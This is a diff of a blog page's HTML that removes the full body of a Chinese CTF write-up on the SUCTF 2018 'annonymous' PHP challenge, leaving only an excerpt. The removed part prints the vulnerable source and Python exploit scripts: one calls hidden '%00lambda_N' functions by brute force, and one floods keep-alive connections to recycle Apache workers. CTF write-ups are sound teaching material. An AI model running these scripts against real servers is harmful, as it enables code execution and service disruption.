@@ -169,7 +169,7 @@
               </span>
               <span class="post-meta-item-text">Posted on</span>
 
-              <time title="Created: 2020-06-21 23:56:21" itemprop="dateCreated datePublished" datetime="2020-06-21T23:56:21+08:00">2020-06-21</time>
+              <time title="Created: 2020-06-21 23:59:10" itemprop="dateCreated datePublished" datetime="2020-06-21T23:59:10+08:00">2020-06-21</time>
             </span>
 
           
@@ -183,43 +183,15 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><code>0x00</code> 前言</h3><p>​    考试周摸鱼还是快乐了，做web是真的快乐。转回这道题目，挺有意思的一道题目。评估的话我觉得我应该做的出来这道题目，但是用时就不好说了，还是太菜了。</p>
-<h3 id="0x01-源码"><a href="#0x01-源码" class="headerlink" title="0x01 源码"></a><code>0x01</code> 源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$MY = create_function(<span class="string">""</span>,<span class="string">"die(`cat flag.php`);"</span>);</span><br><span class="line">$hash = bin2hex(openssl_random_pseudo_bytes(<span class="number">32</span>));</span><br><span class="line"><span class="keyword">eval</span>(<span class="string">"function SUCTF_$hash()&#123;"</span></span><br><span class="line">    .<span class="string">"global \$MY;"</span></span><br><span class="line">    .<span class="string">"\$MY();"</span></span><br><span class="line">    .<span class="string">"&#125;"</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'func_name'</span>]))&#123;</span><br><span class="line">    $_GET[<span class="string">"func_name"</span>]();</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure>
-
-<p>​    简单审计源码就可以知道，这题目定义了一个函数<code>$MY</code>可以直接读取<code>flag</code>。还使用<code>openssl</code>生成了一个随机数。并使用<code>eval</code>定义了另一个调用<code>$MY</code>读取<code>flag</code>的文件。那么这里就有了几个疑点：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1.为什么不直接创建函数，而是要使用 create_function ?</span><br><span class="line">2.看 php 的文档发现 openssl_random_pseudo_bytes 产生的是伪随机数，那么是不是可以直接求出值？</span><br><span class="line">3.这个函数为什么要使用 eval ？是不是可以代码注入？</span><br><span class="line">4.这个 global 有什么必要吗？</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-分析"><a href="#0x02-分析" class="headerlink" title="0x02 分析"></a><code>0x02</code> 分析</h3><p>​    这里选择逐条分析。</p>
-<p>1.为什么使用 create_funcion 函数？</p>
-<p>​    大概是因为不使用 create_function 函数就有可能无法生成<code>$MY</code>了，所以这个应该不算疑点。</p>
-<p>PS: 后面我就会后悔没有注意到为什么要生成 <code>$MY</code>，直接写不香吗？</p>
-<p>2.是否可以获取伪随机数的值？</p>
-<p>​    不可以，本地的多次测试发现这个伪随机数的值无法确定，因为原题中它的种子长度没有写出来。</p>
-<p>3.代码注入是否有可能？</p>
-<p>​    不可能。即使这些代码是在<code>eval</code>中，我们也没有可以操控的部分，根本不可能存在代码注入的。</p>
-<p>结合上面的种种结果看来，只有可能是<code>global</code>这个东西有猫腻了。那么就本地测试输出<code>$GLOBALS</code>试一下。发现了一个奇怪的东西。</p>
-<p><img src="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200621155544image-20200621112739782.png" alt="img"></p>
-<p>​    突然发现<code>$MY</code>居然有值，那么我应该可以使用<code>lambda_1</code>这个名字来直接当函数名不就好了吗？结果试了一下发现完全不行，后来发现这个<code>lambda_1</code>居然会自增，但是无论怎么输入我都无法成功使用，最后实在做不出来了，查看了<code>wp</code>发现</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">create_function()这个函数的漏洞，他create之后会自动生成一个函数名为%<span class="number">00</span>lambda_%d</span><br></pre></td></tr></table></figure>
-
-<p>​    懂了，重新加上<code>%00</code>之后尝试了一下。测试成功了。那么接下来的问题也就很简单嘞。我们可以直接使用脚本来爆破。</p>
-<p>PS:这里是因为自己在测试之后发现最大值好像是100，也就是说到了100之后会回溯到一个比100小的数，这里没有测试这个数是不是1，理论上多试几次是可以出来的。这里运气也比较好，直接就出来了。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://d9e5cd2f-2bfc-415e-8d6f-cd9feece4759.node3.buuoj.cn/?func_name=%00lambda_&#123;&#125;'</span></span><br><span class="line">i = <span class="number">100</span></span><br><span class="line"><span class="keyword">while</span> i&gt;<span class="number">0</span>:</span><br><span class="line">    i = i <span class="number">-1</span></span><br><span class="line">    ans = requests.get(url.format(i))</span><br><span class="line">    print(ans.text)</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://images.cnblogs.com/cnblogs_com/cioi/1558332/o_200621155550image-20200621113825679.png" alt="img"></p>
-<p>​    没想到我这个居然算非预期了，预期解是：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%d这个值是一直递增的，这里的%d会一直递增到最大长度直到结束，这里我们可以通过大量的请求来迫使Pre-fork模式启动的Apache启动新的线程，这样这里的%d会刷新为1，就可以预测了。</span><br></pre></td></tr></table></figure>
-
-<p>exp1:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    r=requests.get(<span class="string">'http://web.suctf.asuri.org:81/?func_name=%00lambda_1'</span>)</span><br><span class="line">    print(r.text)</span><br></pre></td></tr></table></figure>
-
-<p>exp2:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># using python2</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(i)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">'28ae7c60-92ae-447c-a9c9-b50024d45b25.node3.buuoj.cn'</span></span><br><span class="line">        PORT = <span class="number">80</span></span><br><span class="line">        se = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        se.connect((HOST, PORT))</span><br><span class="line">        se.send(<span class="string">"GET / HTTP/1.1\r\n"</span>)</span><br><span class="line">        se.send(<span class="string">"Host: 28ae7c60-92ae-447c-a9c9-b50024d45b25.node3.buuoj.cn\r\n"</span>)</span><br><span class="line">        se.send(<span class="string">"Connection: keep-alive\r\n\r\n"</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">'ok'</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool( i )</span><br><span class="line">result = pool.map_async( run, range(i) ).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure>
-
-
-
-<h3 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a><code>0x03</code> 参考</h3><p><a href="https://www.jianshu.com/p/19e3ee990cb7" target="_blank" rel="noopener">https://www.jianshu.com/p/19e3ee990cb7</a></p>
-
+          <h3 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a><code>0x00</code> 前言</h3><p>​    考试周摸鱼还是快乐了，做web是真的快乐。转回这道题目，挺有意思的一道题目，记录一下吧。</p>
+          <!--noindex-->
+            <div class="post-button">
+              <a class="btn" href="/2020/06/21/%5BSUCTF%202018%5Dannonymous/#more" rel="contents">
+                Read more &raquo;
+              </a>
+            </div>
+          <!--/noindex-->
+        
       
     </div>
 
